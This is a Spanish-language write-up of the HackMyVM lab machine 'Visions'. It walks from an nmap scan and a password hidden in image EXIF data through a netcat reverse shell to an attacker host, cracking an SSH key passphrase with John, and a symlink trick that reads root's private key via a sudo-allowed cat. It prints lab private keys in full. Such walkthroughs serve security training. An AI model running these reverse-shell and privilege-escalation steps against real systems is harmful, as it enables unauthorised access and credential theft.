---
layout: post
title: Visions
date: 2023-04-07
author: BlackCage
categories: [HackMyVM]
tags: [HMV, Enumeration, EXIF, Brute Force]
---

# Visions [ Hack My VM ]
![light mode only](/assets/img/imgs/visions/logo.jpg){: .light }
![dark mode only](/assets/img/imgs/visions/logo_black.png){: .dark }

# Reconocimiento
### NMAP
```
# Nmap 7.93 scan initiated Fri Apr  7 13:39:29 2023 as: nmap -sCV -p22,80 -oN targeted 192.168.1.103
Nmap scan report for 192.168.1.103
Host is up (0.00036s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 85d093ffb6bee848a92c864cb6841f85 (RSA)
|   256 5dfb77a5d3344c4696b628a26b9f74de (ECDSA)
|_  256 763ac58889f2ab82058080f96c3b209d (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:8B:CB:49 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr  7 13:39:49 2023 -- 1 IP address (1 host up) scanned in 19.71 seconds
```

Vemos que el puerto `22` está abierto y que la versión no es la más actual, por desgracia no nos podemos aprovechar.

### Inspección Manual
Al entrar a la página vemos una imagen en blanco, sin ninguna información aparente. Tras inspeccionar el código fuente nos encontramos lo siguiente:

![comment](/assets/img/imgs/visions/comentario.png)

Es un comentario de **Alicia** que nos dice:
> Sólo aquellos que pueden ver lo invisible pueden hacer lo imposible.
<br>
> Tienes que ser capaz de ver lo que no existe.
<br>
> Sólo aquellos que ven lo invisible pueden ver lo que no hay ahí.

Es algo extraño que no estén diciendo esto, pero en unos instantes y más adelante tendrá sentido.

Si bajamos hasta abajo del todo veremos el link hacia la imagen del principio:

![link](/assets/img/imgs/visions/link_img.png)

Vamos a descargarla a nuestro equipo para continuar resolviendo la máquina.

# Movimiento Lateral
### Shell
Para el siguiente paso utilizaremos la imagen descargada para ver si tiene algo escondido, para ello utilizaremos la herramienta **ExifTool** que nos permitirá ver los datos **EXIF** de la imagen.

```sh
┌──(root㉿kali)-[~/…/VMs/HMV/Visions/content]
└─# exiftool white.png
ExifTool Version Number         : 12.57
File Name                       : white.png
Directory                       : .
File Size                       : 13 kB
File Modification Date/Time     : 2021:04:19 05:05:04-04:00
File Access Date/Time           : 2023:04:07 13:40:09-04:00
File Inode Change Date/Time     : 2023:04:07 13:40:02-04:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1920
Image Height                    : 1080
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Background Color                : 255 255 255
Pixels Per Unit X               : 11811
Pixels Per Unit Y               : 11811
Pixel Units                     : meters
Modify Date                     : 2021:04:19 08:26:43
Comment                         : pw:ihaveadream
Image Size                      : 1920x1080
Megapixels                      : 2.1
```

¡Wow! Vemos que tenemos un comentario con la contraseña de **Alicia**.

¡Ya podemos entrar a la máquina!

### Subida de privilegios #1
Una vez como **Alicia** podemos seguir nuestro camino hacia el **control total** de la máquina, aunque antes debemos pasar por otros usuario.

Listé todos los comandos que podía hacer dentro de la máquina:

```sh
alicia@visions:~$ sudo -l
Matching Defaults entries for alicia on visions:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User alicia may run the following commands on visions:
    (emma) NOPASSWD: /usr/bin/nc
```

Vemos que como **Emma** podemos ejecutar el binario de **NetCat** sin necesidad de proporcionar contraseña.

Como muchos sabéis **NnetCat** sirve para establecer conexiones entre equipos, por lo que nos podemos aprovechar y enviarnos una `Shell` a nuestro equipo y así ganar acceso como **Emma**.

Primero de todo será necesario ponernos en escucha en nuestro equipo para así recibir la conexión, en mi caso por el puerto `4444`.

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Visions]
└─# nc -nlvp 4444       
listening on [any] 4444 ...
```

Una vez en escucha podemos proceder al envío de la `Shell` a nuestro equipo:

```sh
alicia@visions:~$ sudo -u emma /usr/bin/nc -e /bin/bash 192.168.1.106 4444
```

Veremos que a primera vista no pasa nada, pero si nos dirijimos a la segunda terminal veremos que hemos recibido una conexión:

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Visions]
└─# nc -nlvp 4444       
listening on [any] 4444 ...
connect to [192.168.1.106] from (UNKNOWN) [192.168.1.103] 47010
emma@visions:/home/alicia$
```

¡Perfecto! Ya estamos como **Emma** en la máquina.

### Subida de privilegios #2
Para el siguiente paso no es tan fácil como el anterior, tenemos que pensar un poco más para el siguiente paso.

Veremos que en este caso no podemos listar los comandos disponibles para nosotros, por lo que no nos sirve de mucho.

Si nos vamos a `/home/emma/`{: .filepath } veremos un archivo llamado `note.txt`, vamos a ver qué contiene:

```sh
emma@visions:~$ cat note.txt
I cant help myself.
```

Lo que nos está diciendo no es muy relevante, así que tras estar un rato investigando se me ocurrió subirle la exposición a la imagen que antes hemos encontrado.

Para este paso me fui a [PineTools](https://pinetools.com/change-image-exposure), una página que tiene todo tipo de herramientas.

Seleccioné la imagen y disminuí al máximo la exposición, estos fueron los resultados:

![ImageExposure](/assets/img/imgs/visions/image_exposure.png)

¡Impresionante! Vemos que tenemos la contraseña de **Sophia** en texto claro, ¡qué bien!

### Subida de privilegios #3
Una vez tengamos la sesión como **Sophia** podemos continuar con la escalada, para ello listaré los comandos disponibles para este usuario:

```sh
sophia@visions:~$ sudo -l
Matching Defaults entries for sophia on visions:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sophia may run the following commands on visions:
    (ALL : ALL) NOPASSWD: /usr/bin/cat /home/isabella/.invisible
```

Vemos que podemos ejecutar el binario **Cat** como cualquier usuario sin contraseña, pero sólo podemos ver el contenido del fichero `.invisible` del directorio personal de **Isabella**. Bueno, vamos a ver qué tenemos:

```sh
sophia@visions:~$ sudo /usr/bin/cat /home/isabella/.invisible
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBMekPa3i
1sMQAToGnurcIWAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDNAxlJldzm
IgVNFXbjg51CS4YEuIxM5gQxjafNJ/rzYw0sOPkT9sL6dYasQcOHX1SYxk5E+qD8QNZQPZ
GfACdWDLwOcI4LLME0BOjARwmrpU4mJXwugX4+RbGICFMgY8ZYtKXEIoF8dwKPVsBdoIwi
lgHyfJD4LwkqfV6mvlau+XRZZBhvlNP10F0SAAZqBaA9y7hRWJO/XcCZC6HzJKzloAL2Xw
GvAMzgtPH/wj06NoOFjmVGMfmmHzCwgc+fLOeXXYzFeRNPH3cVExc+BnB8Ju6CFa6n7VBV
HLCYJ3CcgKnxv6OwVtkoDi0UEFUOefELQV7fZ+g1sZt/+2XPsmcZAAAD0E8RIvVF4XlKJq
INtHdJ5QJZCuq2ufynbPNiHF53PqSlmC//OkQZMWgJ5DcbzMJ92IqxRgjilZZUOUbE/SFI
PViwmpRWIGAhlyoPXyV513ukhb4UngYlgCP9qC4Rbn+Tp9Fv7lnAoD0DsmwITM2e/Z65AD
/i/BqrJ6scNEN0q+qNr3zOVljMZx+qy8cbuDn9Tbq2/N+mcoEysfjfOaoJIgVJnLx1XE6r
+Y9UcRyPAYs+5TB1Nz/fpnBo7vesOu5XLUqCBCphFGmdMCdSGYZAweitjQ+Mq36hQmCtSs
Dwcbjg8vy5LJ+mtJXA7QhqgAfXWnLLny4NeCztUnTG0NLjbLR6M5e+HSsi2EqDYoGNpWld
l4YzVPQoFMIaUJOGTc+VfkMWbQhzpiu66/Du8dwhC+p6QSmwhV/M70eWaH2ZVjK3MThg9K
CVugFsLxioqlp/rnE1oq7apTBX6FOjwz0ne+ytTVOQrHuPTs2QL4PlCvhPRoIuqydleFs4
rdtzE6b46PexXlupewywiO5AVzbfSRAlCYwiwV42xGpYsNcKhdUY+Q9d9i9yudjIFoicrA
MG9hxr7/DJqEY311kTglDEHqQB3faErYsYPiOL9TTZWnPLZhClrPbiWST5tmMWxgNE/AKY
R7mKGDBOMFPlBAjGuKqR6zk5DEc3RzJnvGjUlaT3zzdVmxD8SpWtjzS6xHaSw/WOvB0lsg
Dhf+Gc7OWyHm2qk+OMK9t0/lbIDfn3su0EHwbPjYTT3xk7CtG4AwiSqPve1t9bOdzD9w9r
TM7am/2i/BV1uv28823pCuYZmNG7hu5InzNC/3iTROraE31Qqe3JCNwxVDcHqb8s6gTN+J
q6OyZdvNNiVQUo1l7hNUlg4he4q1kTwoyAATa0hPKVxEFEISRtaQln5Ni8V+fos8GTqgAr
HH2LpFa4qZKTtUEU0f54ixjFL7Lkz6owbUG7Cy+LuGDI1aKJRGCZwd5LkStcF/MAO3pulc
MsHiYwmXT3lNHhkAd1h05N2yBzXaH+M3sX6IpNtq+gi+9F443Enk7FBRFLzxdJ+UT40f6E
+gyA2nBGygNhvQHXcu36A8BoE+IF7YVpdfDmYJffbTujtBUj2vrdsqVvtGUxf0vj9/Sv+J
HN9Yk2giXN8VX7qhcyLzUktmdfgd6JNAx+/P7Kh3HV5oWk1Da+VJS+wtCg/oEVSVyrEOpe
skV8zcwd+ErNODEHTUbD/nDARX8GeV158RMtRdZ5CJZSFjBz2oPDPDVpZMFNhENAAwPnrJ
KD/C2J6CKylbopifizfpEkmVqJRms=
-----END OPENSSH PRIVATE KEY-----
```

Vaya, es una clave OpenSSH privada, vamos a copiarla y a llevarla a nuestro equipo.

Una vez en nuestro equipo le damos los permisos necesarios y con `SSH` nos conectamos como **Isabella**:

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Visions]
└─# chmod 600 isabella.priv_ssh
                                                                                                                                                 
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Visions]
└─# ssh -i isabella.priv_ssh isabella@192.168.1.103
Enter passphrase for key 'isabella.priv_ssh':
```

Vaya, no ha bastado, nos pide una **PassPhrase** para entrar, pero no la sabemos. No pasa nada, podemos aplicar fuerza bruta con **John** y obtener la contraseña.

Antes de proceder con **John** tenemos que pasar la clave `SSH` a un formato que **John** entienda:

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Visions]
└─# ssh2john isabella.priv_ssh > hash.txt
```

Ahora sí, ya tenemos todo lo necesario para aplicar **fuerza bruta** sobre la clave enconntrada:

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Visions]
└─# john hash.txt -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
invisible        (hash.txt)     
1g 0:00:01:17 DONE 0.01287g/s 146.6p/s 146.6c/s 146.6C/s merda..fulanitos
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Tras un rato de espera veremos que **John** nos encontró la contraseña. ¡Ya podemos entrar como **Isabella**!

### Subida de privilegios #4
Bien, ya estamos en la recta final para poder ganar acceso total sobre la máquina.

Ahora que estamos como **Isabella** realizaremos el mismo proceso que en los anteriores usuarios, listar los comandos disponibles:

```sh
isabella@visions:~$ sudo -l
Matching Defaults entries for isabella on visions:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User isabella may run the following commands on visions:
    (emma) NOPASSWD: /usr/bin/man
```

Vemos que podemos ejecutar el binario **Man** como **Emma**, pero no nos sirve porque ya podemos acceder a su sesión, por lo que lo descartamos.

Tras un rato pensando se me ocurrió crear un link hacia el fichero `id_rsa` en `/root/.ssh/`{: .filepath } y con el usuario **Sophia** leer el contenido, ya que podemos ejecutar **Cat** como cualquier usuario sin contraseña, incluyendo `root`.

```sh
isabella@visions:~$ rm .invisible
isabella@visions:~$ ln -s /root/.ssh/id_rsa .invisible
isabella@visions:~$ ls -la
total 28
drwxr-xr-x 3 isabella isabella 4096 Apr  7 17:21 .
drwxr-xr-x 6 root     root     4096 Apr 19  2021 ..
-rw------- 1 isabella isabella  198 Apr  7 14:32 .bash_history
-rw-r--r-- 1 isabella isabella  220 Apr 19  2021 .bash_logout
-rw-r--r-- 1 isabella isabella 3526 Apr 19  2021 .bashrc
lrwxrwxrwx 1 isabella isabella   17 Apr  7 17:21 .invisible -> /root/.ssh/id_rsa
-rw-r--r-- 1 isabella isabella  807 Apr 19  2021 .profile
drwx------ 2 isabella isabella 4096 Apr 19  2021 .ssh
```

Como vemos ahora el fichero `.invisible` apunta hacia la `id_rsa` de `root`. Vámonos a la sesión de **Sophia** para continuar la escalada.

Una vez dentro podemos ejecutar el mismo comando de antes para así poder leer el contenido de `.invisible`, el cual ahora nos dará la `id_rsa` de `root`:

```sh
sophia@visions:~$ sudo /usr/bin/cat /home/isabella/.invisible
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAyezVs6KCQ/KFWpEkzDWX3ns/X4lUnh6PnNC2IVg3ciVgLcWF//wb
vlQxI+juYu5qTKVEL1FhkNaas+MlQUxabzOv+SDnCck60BLQbZf46sYHQaTrDyu5zhIWWi
wgPjmic/Ykd2qIQyIpyy9Ru4DiVK4RWLZWM28kb6eB99JTt4GSVEhraJ08hKsgaOi+skNg
S4QG85kG4ghmA1yJpPwzzpIdG4HUic63OXgy+z+pVB5oIEp0YXrCKMN/lBngZjZb9/+0S1
ljKzdcq7m1TOQ1Y04YJNMrxvPJ75d8U5s+m6cRxx5F3dX7oTVmErEAxFmJjdWVChzh81Ca
OnicNjHgrQAAA8hmM8ISZjPCEgAAAAdzc2gtcnNhAAABAQDJ7NWzooJD8oVakSTMNZfeez
9fiVSeHo+c0LYhWDdyJWAtxYX//Bu+VDEj6O5i7mpMpUQvUWGQ1pqz4yVBTFpvM6/5IOcJ
yTrQEtBtl/jqxgdBpOsPK7nOEhZaLCA+OaJz9iR3aohDIinLL1G7gOJUrhFYtlYzbyRvp4
H30lO3gZJUSGtonTyEqyBo6L6yQ2BLhAbzmQbiCGYDXImk/DPOkh0bgdSJzrc5eDL7P6lU
HmggSnRhesIow3+UGeBmNlv3/7RLWWMrN1yrubVM5DVjThgk0yvG88nvl3xTmz6bpxHHHk
Xd1fuhNWYSsQDEWYmN1ZUKHOHzUJo6eJw2MeCtAAAAAwEAAQAAAQEAiCmVXYHLN8h1VkIj
vzSwiU0wydqQXeOb0hIHjuqu0OEVPyhAGQNHLgwV6vIqtjmxIqgbF5FYKlQclAsq1yKGpR
AErQkb4sR4TVEyjYR6TM5mnER6YYuJysT1n667u1ogCvRDWOdUpXiHGEV7ZuYdOR78AYdL
D3n15vjcsmF5JHcftHOxnXraX7JqGXNCoRsMLT/yUOl02ClHsjFql1NTI/Br0GA4xhM/16
RHoRu1itOlWoyF4XSpSUDHW0RVQ/0gm/GyAc9QF6EWZXHfMfW07JvkeQLlndVbnItQ9a3v
ICAAh6zOZWVXpbhCPjjfaWTnwHhhSE3vfxMQQNTJnEghnQAAAIEAjAEzb6Xp6VV1RRaJR3
/Gxo0BRIbPJXdRXpDI3NO4Nvtzv8fX3muV/i+dgYPNqa7cwheSJZX9S7RzXsZTZn1Ywbdw
ahYTVyE9B4Nsen5gekylb59tNwPpCR8sJo6ZIL1GpmkEug+r+0YZyqpZXpG5uhCaSLX1fP
3UnkgqiKuzpvQAAACBAOOlQPW6pWXvULDsiUkilMXY0SNYLupMHJuqnWTuufyNfRthPQF2
gfWwXRjfDmzFoM9vVxJKKSd40696qbmTNnu7I4KyvXkF0OQ3IXIelQIiIcDpDbYd17g47J
IC6dHIQmUib3+whjeTvA5cc21y0EGNHoeNrlknE03dZHaIyfdPAAAAgQDjE3TE17PMEnd/
vzau9bBYZaoRt+eYmvXFrkU/UdRwqjS/LPWxwmpLOASW9x3bH/aiqNGBKeSe2k4C7MWWD5
tllkIbNEJNDtqQNt2NRvhDUOzAxca1C/IySuwoCAvoym5cpZ//EQ/OvWyZRwk3enReVmmd
x7Itf3P39SxqlP2pQwAAAAxyb290QHZpc2lvbnMBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

¡Ennhorabuena! Ya tenemos la clave privada `RSA` de `root`, por lo que ya tenemos acceso total a la máquina. ¡Qué fácil!